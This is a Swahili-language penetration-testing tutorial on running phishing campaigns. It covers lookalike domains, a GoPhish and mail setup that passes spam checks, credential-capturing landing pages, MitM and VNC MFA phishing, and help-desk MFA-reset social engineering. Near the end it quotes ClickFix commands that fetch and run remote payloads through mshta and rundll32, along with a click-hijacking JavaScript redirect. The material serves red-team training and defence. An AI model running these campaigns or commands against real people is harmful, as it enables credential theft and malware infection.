# Mbinu ya Phishing

{{#include ../../banners/hacktricks-training.md}}

## Mbinu

1. Fanya upelelezi wa mwathiriwa
   1. Chagua **domain ya mwathiriwa**.
   2. Fanya uchunguzi wa msingi wa wavuti **kutafuta login portals** zinazotumiwa na mwathiriwa na **amua** ni ipi utakayo **iga**.
   3. Tumia **OSINT** kutafuta **anwani za barua pepe**.
2. Andaa mazingira
   1. **Nunua domain** utakayotumia kwa tathmini ya phishing
   2. **Sanidi rekodi zinazohusiana na huduma ya barua pepe** (SPF, DMARC, DKIM, rDNS)
   3. Sanidi VPS yenye **gophish**
3. Andaa kampeni
   1. Andaa **kiolezo cha barua pepe**
   2. Andaa **ukurasa wa wavuti** wa kuiba credentials
4. Zindua kampeni!

## Tengeneza majina ya domain yanayofanana au nunua domain inayoaminika

### Mbinu za Kubadilisha Majina ya Domain

- **Keyword**: Jina la domain **lina** **keyword** muhimu ya domain asili (mf., zelster.com-management.com).<sup>[[1]](#references)</sup>
- **Subdomain yenye hyphen**: Badilisha **nukta iwe hyphen** katika subdomain (mf., www-zelster.com).
- **TLD mpya**: Domain ileile ikitumia **TLD mpya** (mf., zelster.org)
- **Homoglyph**: **Hubadilisha** herufi moja katika jina la domain na **herufi zinazofanana kwa mwonekano** (mf., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** **Hubadilisha nafasi za herufi mbili** ndani ya jina la domain (mf., zelsetr.com).
- **Kuweka katika umoja/wingi**: Huongeza au kuondoa “s” mwishoni mwa jina la domain (mf., zeltsers.com).
- **Kuacha herufi**: **Huondoa herufi moja** kutoka kwenye jina la domain (mf., zelser.com).
- **Kurudia herufi:** **Hurudia herufi moja** katika jina la domain (mf., zeltsser.com).
- **Kubadilisha herufi**: Kama homoglyph lakini si fiche sana. Hubadilisha mojawapo ya herufi katika jina la domain, labda kwa herufi iliyo karibu na herufi asili kwenye kibodi (mf., zektser.com).
- **Kuweka subdomain**: Ingiza **nukta** ndani ya jina la domain (mf., ze.lster.com).
- **Kuingiza herufi**: **Huongeza herufi** ndani ya jina la domain (mf., zerltser.com).
- **Nukta inayokosekana**: Ongeza TLD mwishoni mwa jina la domain. (mf., zelstercom.com)

**Zana za Kiotomatiki**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Tovuti**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Kuna **uwezekano kwamba baadhi ya bits zilizohifadhiwa au zinazowasilishwa zinaweza kubadilishwa zenyewe** kutokana na sababu mbalimbali kama vile miale ya jua, miale ya cosmic au hitilafu za vifaa.

Dhana hii **inapotumika kwa maombi ya DNS**, inawezekana kwamba **domain inayopokelewa na seva ya DNS** si sawa na domain iliyoombwa mwanzoni.

Kwa mfano, kubadilika kwa bit moja katika domain "windows.com" kunaweza kuibadilisha kuwa "windnws.com."

Washambuliaji wanaweza **kunufaika na hili kwa kusajili domains nyingi zilizobadilishwa kwa bit** zinazofanana na domain ya mwathiriwa. Nia yao ni kuelekeza watumiaji halali kwenye miundombinu yao.

Kwa maelezo zaidi soma [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Nunua domain inayoaminika

Unaweza kutafuta domain iliyoisha muda wake unayoweza kutumia kwenye [https://www.expireddomains.net/](https://www.expireddomains.net).\
Ili kuhakikisha kwamba domain iliyoisha muda wake unayotaka kununua **tayari ina SEO nzuri**, unaweza kuangalia imeainishwaje kwenye:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Kugundua Anwani za Barua Pepe

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (bure 100%)
- [https://phonebook.cz/](https://phonebook.cz) (bure 100%)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Ili **kugundua anwani zaidi** za barua pepe halali au **kuthibitisha zile** ambazo tayari umegundua, unaweza kuangalia kama unaweza kuzibashiri kwa nguvu kupitia seva za smtp za mwathiriwa. [Jifunze jinsi ya kuthibitisha/kugundua anwani za barua pepe hapa](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Pia, usisahau kwamba ikiwa watumiaji wanatumia **web portal yoyote kufikia barua pepe zao**, unaweza kuangalia kama inashambuliwa kwa **username brute force**, na kutumia udhaifu huo ikiwezekana.

## Kusanidi GoPhish

### Usakinishaji

Unaweza kuipakua kutoka [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Pakua na uifungue ndani ya `/opt/gophish`, kisha tekeleza `/opt/gophish/gophish`\
Utapewa nenosiri la mtumiaji admin kwenye port 3333 katika matokeo. Kwa hiyo, nenda kwenye port hiyo na utumie credentials hizo kubadilisha nenosiri la admin. Huenda ukahitaji kuelekeza port hiyo kwa local kupitia tunnel:

```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```

### Usanidi

**Usanidi wa cheti cha TLS**

Kabla ya hatua hii, unapaswa kuwa tayari umenunua domain utakayotumia, na lazima iwe inaelekeza kwenye IP ya VPS unayosanidi **gophish**.

```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```

**Usanidi wa barua pepe**

Anza kusakinisha: `apt-get install postfix`

Kisha ongeza domain kwenye faili zifuatazo:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Pia badilisha thamani za vigezo vifuatavyo ndani ya /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Hatimaye, rekebisha faili **`/etc/hostname`** na **`/etc/mailname`** ili ziwe na jina la domain yako, kisha **anzisha upya VPS yako.**

Sasa, tengeneza **DNS A record** ya `mail.<domain>` inayoelekeza kwenye **anwani ya IP** ya VPS, na **DNS MX record** inayoelekeza kwenye `mail.<domain>`

Sasa tujaribu kutuma barua pepe:

```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```

**Usanidi wa Gophish**

Simamisha uendeshaji wa gophish ili tuisanidi.\
Badilisha `/opt/gophish/config.json` iwe kama ifuatavyo (zingatia matumizi ya https):

```bash
{
        "admin_server": {
                "listen_url": "127.0.0.1:3333",
                "use_tls": true,
                "cert_path": "gophish_admin.crt",
                "key_path": "gophish_admin.key"
        },
        "phish_server": {
                "listen_url": "0.0.0.0:443",
                "use_tls": true,
                "cert_path": "/opt/gophish/ssl_keys/key.crt",
                "key_path": "/opt/gophish/ssl_keys/key.pem"
        },
        "db_name": "sqlite3",
        "db_path": "gophish.db",
        "migrations_prefix": "db/db_",
        "contact_address": "",
        "logging": {
                "filename": "",
                "level": ""
        }
}
```

**Sanidi huduma ya gophish**

Ili kuunda huduma ya gophish ili iweze kuwashwa kiotomatiki na kusimamiwa kama huduma, unaweza kuunda faili `/etc/init.d/gophish` yenye maudhui yafuatayo:

```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
    echo 'Starting '${processName}'...'
    cd ${appDirectory}
    nohup ./$process >>$logfile 2>>$errfile &
    sleep 1
}

stop() {
    echo 'Stopping '${processName}'...'
    pid=$(/bin/pidof ${process})
    kill ${pid}
    sleep 1
}

status() {
    pid=$(/bin/pidof ${process})
    if [["$pid" != ""| "$pid" != "" ]]; then
        echo ${processName}' is running...'
    else
        echo ${processName}' is not running...'
    fi
}

case $1 in
    start|stop|status) "$1" ;;
esac
```

Kamilisha kusanidi huduma na kuikagua kwa kufanya:

```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```

## Kusanidi seva ya barua pepe na domain

### Subiri na uwe halali

Kadiri domain inavyokuwa ya zamani, ndivyo uwezekano wa kugunduliwa kama spam unavyopungua. Kwa hiyo, subiri kwa muda mrefu iwezekanavyo (angalau wiki 1) kabla ya kufanya tathmini ya phishing. Zaidi ya hayo, ukiweka ukurasa kuhusu sekta yenye sifa nzuri, sifa utakayopata itakuwa bora zaidi.

Kumbuka kwamba hata kama unapaswa kusubiri wiki moja, unaweza kumaliza kusanidi kila kitu sasa.

### Sanidi rekodi ya Reverse DNS (rDNS)

Weka rekodi ya rDNS (PTR) inayotatua anwani ya IP ya VPS kuwa jina la domain.

### Rekodi ya Sender Policy Framework (SPF)

Lazima **usanidi rekodi ya SPF kwa domain mpya**. Ikiwa hujui rekodi ya SPF ni nini, [**soma ukurasa huu**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Unaweza kutumia [https://www.spfwizard.net/](https://www.spfwizard.net) kutengeneza sera yako ya SPF (tumia IP ya mashine ya VPS)

![Fomu ya SPF Wizard ya kutengeneza rekodi ya SPF kwa domain ya phishing](<../../images/image (1037).png>)

Haya ndiyo maudhui yanayopaswa kuwekwa ndani ya rekodi ya TXT kwenye domain:

```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```

### Rekodi ya Domain-based Message Authentication, Reporting & Conformance (DMARC)

Lazima **usanidi rekodi ya DMARC kwa domain mpya**. Ikiwa hujui rekodi ya DMARC ni nini, [**soma ukurasa huu**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Unapaswa kuunda rekodi mpya ya DNS TXT inayoelekeza kwenye hostname `_dmarc.<domain>` yenye maudhui yafuatayo:

```bash
v=DMARC1; p=none
```

### DomainKeys Identified Mail (DKIM)

Lazima **usanidi DKIM kwa domain mpya**. Ikiwa hujui rekodi ya DKIM ni nini, [**soma ukurasa huu**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Mafunzo haya yanatokana na: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Unahitaji kuunganisha thamani zote mbili za B64 zinazozalishwa na ufunguo wa DKIM:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Jaribu alama ya usanidi wa barua pepe yako

Unaweza kufanya hivyo ukitumia [https://www.mail-tester.com/](https://www.mail-tester.com)\
Tembelea tu ukurasa huo na utume barua pepe kwa anwani watakayokupa:

```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```

Unaweza pia **kuangalia usanidi wa email yako** kwa kutuma email kwa `check-auth@verifier.port25.com` na **kusoma jibu** (kwa hili utahitaji **kufungua** port **25** na kuona jibu kwenye faili _/var/mail/root_ ikiwa utatuma email ukiwa root).\
Hakikisha unapita majaribio yote:

```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```

Unaweza pia kutuma **ujumbe kwa akaunti ya Gmail unayoidhibiti**, kisha uangalie **vichwa vya barua pepe** kwenye kikasha chako cha Gmail. `dkim=pass` inapaswa kuwepo kwenye sehemu ya kichwa cha `Authentication-Results`.

```
Authentication-Results: mx.google.com;
       spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
       dkim=pass header.i=@example.com;
```

### ​Kuondolewa kwenye Orodha Nyeusi ya Spamhouse

Ukurasa [www.mail-tester.com](https://www.mail-tester.com) unaweza kukuonyesha ikiwa kikoa chako kimezuiwa na Spamhaus. Unaweza kuomba kikoa/IP yako iondolewe hapa: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Kuondolewa kwenye Orodha Nyeusi ya Microsoft

​​Unaweza kuomba kikoa/IP yako iondolewe hapa [https://sender.office.com/](https://sender.office.com).

## Unda na Uzindue Kampeni ya GoPhish

### Wasifu wa Kutuma

- Weka **jina la kutambua** wasifu wa mtumaji
- Amua ni akaunti gani utakayotumia kutuma barua pepe za phishing. Mapendekezo: _noreply, support, servicedesk, salesforce..._
- Unaweza kuacha sehemu za jina la mtumiaji na nenosiri wazi, lakini hakikisha umechagua Ignore Certificate Errors

![Unda na Uzindue Kampeni ya GoPhish - Wasifu wa Kutuma: Unaweza kuacha sehemu za jina la mtumiaji na nenosiri wazi, lakini hakikisha umechagua Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Inapendekezwa kutumia kipengele cha "**Tuma Barua Pepe ya Majaribio**" ili kujaribu kama kila kitu kinafanya kazi.\
> Ninapendekeza **utume barua pepe za majaribio kwa anwani za 10min mail** ili kuepuka kuwekwa kwenye orodha nyeusi wakati wa majaribio.

### Kiolezo cha Barua Pepe

- Weka **jina la kutambua** kiolezo
- Kisha andika **mada** (usiandike jambo lisilo la kawaida, andika tu kitu ambacho ungetarajia kusoma kwenye barua pepe ya kawaida)
- Hakikisha umechagua "**Ongeza Picha ya Ufuatiliaji**"
- Andika **kiolezo cha barua pepe** (unaweza kutumia vigeu kama katika mfano ufuatao):

```html
<html>
<head>
    <title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```

Kumbuka kwamba **ili kuongeza uaminifu wa barua pepe**, inapendekezwa kutumia sahihi kutoka kwenye barua pepe ya mteja. Mapendekezo:

- Tuma barua pepe kwa **anwani isiyopo** na uangalie kama jibu lina sahihi.
- Tafuta **anwani za barua pepe za umma** kama info@ex.com au press@ex.com au public@ex.com, kisha uzitumie barua pepe na usubiri jibu.
- Jaribu kuwasiliana na **anwani halali iliyogunduliwa** na usubiri jibu.

![Sending Profile - Email Template: Jaribu kuwasiliana na anwani halali iliyogunduliwa na usubiri jibu](<../../images/image (80).png>)

> [!TIP]
> Email Template pia inaruhusu **kuambatisha faili za kutuma**. Ikiwa ungependa pia kuiba NTLM challenges kwa kutumia faili/hati zilizotengenezwa mahususi, [soma ukurasa huu](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Weka **jina**
- **Andika HTML code** ya ukurasa wa wavuti. Kumbuka kuwa unaweza **kuagiza** kurasa za wavuti.
- Chagua **Capture Submitted Data** na **Capture Passwords**
- Weka **redirection**

![Email Template - Landing Page: Chagua Capture Submitted Data na Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Kwa kawaida utahitaji kurekebisha HTML code ya ukurasa na kufanya majaribio kwenye mashine yako (labda ukitumia Apache server) **hadi utakaporidhika na matokeo.** Kisha, andika HTML code hiyo kwenye kisanduku.\
> Kumbuka kwamba ikiwa unahitaji **kutumia baadhi ya static resources** za HTML (labda kurasa za CSS na JS), unaweza kuzihifadhi kwenye _**/opt/gophish/static/endpoint**_ na kisha kuzifikia kupitia _**/static/\<filename>**_

> [!TIP]
> Kwa redirection, unaweza **kuwaelekeza watumiaji kwenye ukurasa mkuu halali** wa mwathiriwa, au kuwaelekeza kwenye _/static/migration.html_ kwa mfano, uweke **gurudumu linalozunguka (**[**https://loading.io/**](https://loading.io)**) kwa sekunde 5 kisha uonyeshe kwamba mchakato umekamilika kwa mafanikio**.

### Users & Groups

- Weka jina
- **Ingiza data** (kumbuka kwamba ili kutumia template ya mfano unahitaji jina la kwanza, jina la mwisho na anwani ya barua pepe ya kila mtumiaji)

![Landing Page - Users & Groups: Ingiza data (kumbuka kwamba ili kutumia template ya mfano unahitaji jina la kwanza, jina la mwisho na anwani ya barua pepe ya kila mtumiaji)](<../../images/image (163).png>)

### Campaign

Hatimaye, tengeneza campaign kwa kuchagua jina, email template, landing page, URL, sending profile na group. Kumbuka kwamba URL itakuwa kiungo kitakachotumwa kwa waathiriwa.

Kumbuka kwamba **Sending Profile inaruhusu kutuma barua pepe ya majaribio ili kuona jinsi barua pepe ya mwisho ya phishing itakavyoonekana**:

![Users & Groups - Campaign: Kumbuka kwamba Sending Profile inaruhusu kutuma barua pepe ya majaribio ili kuona jinsi barua pepe ya mwisho ya phishing itakavyoonekana](<../../images/image (192).png>)

Kila kitu kikiwa tayari, anzisha campaign!

## Website Cloning

Ikiwa kwa sababu yoyote unataka kuiga website, angalia ukurasa ufuatao:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

Katika baadhi ya tathmini za phishing (hasa kwa Red Teams) utataka pia **kutuma faili zilizo na aina fulani ya backdoor** (labda C2 au kitu kitakachosababisha uthibitishaji).\
Angalia ukurasa ufuatao kwa baadhi ya mifano:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Shambulio lililotangulia ni la werevu kwa kuwa unaiga website halisi na kukusanya taarifa zilizoingizwa na mtumiaji. Kwa bahati mbaya, ikiwa mtumiaji hakuingiza password sahihi au ikiwa application uliyoiga imesanidiwa kwa 2FA, **taarifa hii haitakuwezesha kujifanya kuwa mtumiaji aliyedanganywa**.

Hapa ndipo tools kama [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) na [**muraena**](https://github.com/muraenateam/muraena) zinapofaa. Tool hii itakuwezesha kufanya shambulio la aina ya MitM. Kimsingi, mashambulio hufanya kazi kwa njia ifuatayo:

1. Unaiga form ya **login** ya webpage halisi.
2. Mtumiaji **hutuma** **credentials** zake kwenye ukurasa wako wa uongo, na tool huzituma kwenye webpage halisi, **ikiangalia kama credentials zinafanya kazi**.
3. Ikiwa akaunti imesanidiwa kwa **2FA**, ukurasa wa MitM utaomba taarifa hiyo, na mara tu **mtumiaji anapoiingiza**, tool itaituma kwenye webpage halisi.
4. Mtumiaji akishathibitishwa, wewe (kama mshambuliaji) utakuwa **umekamata credentials, 2FA, cookie na taarifa yoyote** kutoka kwa mwingiliano wote uliofanya wakati tool ilipokuwa inatekeleza MitM.

### Via VNC

Vipi ikiwa badala ya **kumpeleka mwathiriwa kwenye ukurasa hasidi** unaofanana na ukurasa wa awali, utampeleka kwenye **kipindi cha VNC chenye browser iliyounganishwa kwenye webpage halisi**? Utaweza kuona anachofanya, kuiba password, MFA aliyotumia, cookies...\
Unaweza kufanya hivi kwa kutumia [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>

## Detecting the detection

Ni wazi kwamba mojawapo ya njia bora za kujua kama umenaswa ni **kutafuta domain yako kwenye blacklists**. Ikiwa imeorodheshwa, ina maana kwamba kwa namna fulani domain yako ilitambuliwa kuwa ya kutiliwa shaka.\
Njia rahisi ya kuangalia kama domain yako ipo kwenye blacklist yoyote ni kutumia [https://malwareworld.com/](https://malwareworld.com)

Hata hivyo, kuna njia nyingine za kujua kama mwathiriwa **anatafuta kwa bidii shughuli za phishing zinazotiliwa shaka mtandaoni**, kama ilivyoelezwa kwenye:


{{#ref}}
detecting-phising.md
{{#endref}}

Unaweza **kununua domain yenye jina linalofanana sana** na domain ya mwathiriwa **na/au kutengeneza certificate** ya **subdomain** ya domain unayoidhibiti **iliyo na** **keyword** ya domain ya mwathiriwa. Ikiwa **mwathiriwa** atafanya aina yoyote ya **DNS au HTTP interaction** na hizo, utajua kwamba **anatafuta kwa bidii domains zinazotiliwa shaka**, na utahitaji kuwa mwangalifu sana.<sup>[[2]](#references)</sup>

### Evaluate the phishing

Tumia [**Phishious** ](https://github.com/Rices/Phishious)kutathmini kama barua pepe yako itaishia kwenye spam folder au itazuiwa, au kama itafaulu.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Vikundi vya kisasa vya uvamizi vinazidi kuruka kabisa mitego ya barua pepe na **kulenga moja kwa moja mchakato wa service-desk / identity-recovery** ili kushinda MFA. Shambulio hili hutumia kikamilifu mbinu ya "living-off-the-land": mara tu opereta anapokuwa na credentials halali, hutumia admin tooling iliyojengewa ndani kusonga mbele – hakuna malware inayohitajika.<sup>[[6]](#references)</sup>

### Attack flow
1. Fanya Recon ya mwathiriwa 
   * Kusanya maelezo ya kibinafsi na ya kikazi kutoka LinkedIn, data breaches, public GitHub, n.k.  
   * Tambua identities zenye thamani ya juu (watendaji wakuu, IT, fedha) na chunguza **mchakato halisi wa help-desk** wa kuweka upya password / MFA.
2. Uhandisi wa kijamii wa wakati halisi  
   * Piga simu, tuma ujumbe kupitia Teams au chat kwa help-desk huku ukijifanya kuwa mlengwa (mara nyingi kwa kutumia **caller-ID iliyoghushiwa** au **sauti iliyonakiliwa**).  
   * Toa PII iliyokusanywa awali ili kupita uthibitishaji unaotegemea maswali ya maarifa.  
   * Mshawishi wakala **aweke upya MFA secret** au atekeleze **SIM-swap** kwenye nambari ya simu iliyosajiliwa.
3. Hatua za mara moja baada ya kupata ufikiaji (≤60 min katika hali halisi)  
   * Anzisha foothold kupitia portal yoyote ya web SSO.  
   * Chunguza AD / AzureAD kwa kutumia built-ins (hakuna binaries zinazoachwa):
     ```powershell
     # list directory groups & privileged roles
     Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

     # AzureAD / Graph – list directory roles
     Get-MgDirectoryRole | ft DisplayName,Id

     # Enumerate devices the account can login to
     Get-MgUserRegisteredDevice -UserId <user@corp.local>
     ```
   * Harakati za upande kwa kutumia **WMI**, **PsExec**, au mawakala halali wa **RMM** ambao tayari wameidhinishwa katika mazingira.

### Ugunduzi na Upunguzaji wa Hatari
* Chukulia urejeshaji wa utambulisho kupitia help desk kama **operesheni yenye upendeleo wa juu** – hitaji uthibitishaji wa ziada na idhini ya meneja.
* Tekeleza sheria za **Identity Threat Detection & Response (ITDR)** / **UEBA** zinazotoa tahadhari kuhusu:  
  * Mbinu ya MFA kubadilishwa + uthibitishaji kutoka kifaa / eneo jipya.  
  * Kuongezwa mara moja kwa upendeleo wa principal yuleyule (user-→-admin).  
* Rekodi simu za help desk na utekeleze **kupiga tena nambari iliyosajiliwa tayari** kabla ya kuweka upya akaunti yoyote.
* Tekeleza **Just-In-Time (JIT) / Privileged Access** ili akaunti zilizowekwa upya zisirithi tokeni za upendeleo wa juu moja kwa moja.

---

## Udanganyifu kwa Wingi – SEO Poisoning na Kampeni za “ClickFix”
Vikundi vya kawaida hupunguza gharama za operesheni zinazohitaji uangalizi wa karibu kwa kufanya mashambulizi ya wingi yanayogeuza **injini za utafutaji na mitandao ya matangazo kuwa njia za usambazaji**.<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising** huweka matokeo bandia kama `chromium-update[.]site` juu ya matangazo ya utafutaji.
2. Mlengwa hupakua **first-stage loader** ndogo (mara nyingi JS/HTA/ISO). Mifano iliyoonekana na Unit 42:
   * `RedLine stealer`
   * `Lumma stealer`
   * `Lampion Trojan`
3. Loader huiba cookies za kivinjari na hifadhidata za vitambulisho, kisha hupakua **silent loader** inayoamua – *kwa wakati halisi* – ikiwa itasambaza:
   * RAT (k.m. AsyncRAT, RustDesk)
   * ransomware / wiper
   * kipengele cha persistence (ufunguo wa registry Run + scheduled task)

### Vidokezo vya Kuimarisha Usalama
* Zuia domain zilizosajiliwa hivi karibuni na utekeleze **Advanced DNS / URL Filtering** kwenye *search-ads* na pia barua pepe.
* Zuia usakinishaji wa programu isipokuwa vifurushi vya MSI vilivyosainiwa / vya Store; kataza utekelezaji wa `HTA`, `ISO`, `VBS` kupitia sera.
* Fuatilia michakato tanzu ya vivinjari inayofungua visakinishi:
  ```yaml
  - parent_image: /Program Files/Google/Chrome/*
    and child_image: *\\*.exe
  ```
* Tafuta LOLBins zinazotumiwa vibaya mara kwa mara na first-stage loaders (e.g. `regsvr32`, `curl`, `mshta`).

### Utekaji wa click ya kitufe cha kupakua kwa handoff ya TDS
Baadhi ya tovuti bandia za programu huacha `href` inayoonekana ya kupakua ikielekeza kwenye URL **halisi** ya GitHub/release lakini huteka **interaksi ya kwanza** ya mtumiaji kupitia JavaScript na kumpeleka mwathiriwa kwenye mnyororo wa **Traffic Distribution System (TDS)** badala yake.<sup>[[9]](#references)</sup>

```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
  if (!isEligibleClick(e.target)) return;
  cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
  e.stopImmediatePropagation();
  e.preventDefault();
}, true);
```

Sifa kuu:
- Hook kwa kawaida hutekelezwa katika **capture phase** (`true`) kwenye `document`, hivyo hutokea kabla ya handlers za tovuti.
- Chrome mara nyingi hutumia `mousedown` badala ya `click` ili kuhusisha redirect na **user gesture** halali na kuboresha uwezo wa kukwepa popup-blocker.
- Baadhi ya variants hufungua mapema `about:blank` au kuiga mibofyo ya `<a target="_blank">`, kisha baadaye huweka URL ya TDS.
- Vikomo vya upande wa browser mara nyingi huhifadhiwa kwenye `localStorage`, kwa hiyo **mibofyo ya kwanza** inaweza kuelekeza kwenye malware, ilhali refresh/retry hurudi kwenye link inayoonekana isiyo na madhara.
- TDS inaweza kutumia referrer, entry domain, GEO, browser/device fingerprint, ukaguzi wa VPN/datacenter, click context na vihesabu vya kila session kama masharti, hivyo matokeo ya marudio ya mchambuzi hayawezi kutabirika.

Mawazo kwa watetezi:
- Linganisha `href` **inayoonyeshwa** na lengwa **halisi** la navigation linalozalishwa wakati wa kubofya.
- Tafuta handlers za `document.addEventListener(..., true)` zinazotumia pamoja `preventDefault()` na `stopImmediatePropagation()` karibu na `window.open`, `about:blank` au mibofyo ya anchor inayoundwa kwa script.
- Chukulia makundi ya domains mpya zilizosajiliwa za kupakua software ambazo zote hupakia hatua ileile ya CloudFront/JS kuwa muundo wenye ishara kubwa wa SEO-poisoning/TDS.

### ClickFix kutoka kwenye kurasa bandia za uthibitishaji + upakuaji wa LOLBAS unaofanana na wa archive
Baadhi ya matawi ya TDS huishia kwenye ukurasa bandia wa uthibitishaji (mtindo wa Cloudflare/IUAM) unaomwambia mwathiriwa aendeshe binary inayoaminika ya Windows kama vile:<sup>[[9]](#references)</sup>

```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```

Vidokezo:
- `mshta.exe` hutekeleza **HTA/VBScript mwanzoni mwa response**, hata kama URL inajifanya kuwa archive ya `.7z`; data ya archive iliyoongezwa inaweza kuwa chambo tupu.
- Hatua zinazofuata mara nyingi huendelea kudanganya kuhusu aina ya faili (`.rtf` kwa PowerShell, `.asar` kwa Python, ZIP zenye binaries zilizoongezewa padding) kisha hubadilika na kutumia **manual PE mapping / in-memory execution**.
- Ukijibu mojawapo ya chain hizi, hifadhi **network + memory kuanzia run ya kwanza iliyofaulu**: replay za baadaye zinaweza kuonyesha tu njia isiyo na madhara ya installer/SFX au kushindwa kwa sababu payload/key release ilifungamanishwa na TDS session ya awali.

### ClickFix DLL delivery tradecraft (sasisho bandia la CERT)
* Chambo: ushauri wa kitaifa wa CERT ulionakiliwa wenye kitufe cha **Update** kinachoonyesha maelekezo ya “fix” hatua kwa hatua. Waathiriwa wanaambiwa waendeshe batch inayopakua DLL na kuitekeleza kupitia `rundll32`.<sup>[[12]](#references)</sup>
* Mfuatano wa kawaida wa batch ulioonekana:
  ```cmd
  echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
  echo timeout /t 10
  echo rundll32.exe "%TEMP%\notepad2.dll",notepad
  ```
